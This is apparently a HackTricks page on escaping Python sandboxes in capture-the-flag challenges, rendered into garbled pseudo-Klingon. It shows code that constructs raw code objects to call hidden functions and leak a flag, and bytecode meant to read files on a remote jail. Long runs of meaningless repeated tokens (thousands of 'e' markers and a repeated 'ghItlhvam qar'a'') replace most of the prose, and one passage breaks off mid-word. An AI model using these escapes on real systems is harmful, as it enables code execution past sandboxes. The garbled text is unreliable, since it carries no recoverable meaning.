**'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
DependIng on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### qo'noS le' vItlhutlh

{% hint style="warning" %}
vaj qatlh example, maHegh data vItlhutlh function vItlhutlh function code object directly. **real example** vaj **values** execute function **`code_type`** **leak** **you will need to**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Bypass Defenses

In previous examples at the beginning of this post, you can see **how to execute any python code using the `compile` function**. This is interesting because you can **execute whole scripts** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
Anyway, sometimes it could be useful to **create** a **compiled object** in a local machine and execute it in the **CTF machine** (for example because we don't have the `compiled` function in the CTF).

For example, let's compile and execute manually a function that reads _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
**ghItlhvam** `eval` **je** `exec` **ghaHbe'chugh**, **ghobe'** **ghItlhvam** **tlhIngan** **ghItlhvam**, **'ach** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlh
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## ʼIw HIq

[**https://www.decompiler.com/**](https://www.decompiler.com) **ghItlh** **decompile** compiled python code.

**tutorial vItlhutlh**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Misc Python

### Assert

Python executed with optimizations with the param `-O` will remove asset statements and any code conditional on the value of **debug**.\
Therefore, checks like
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## References

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
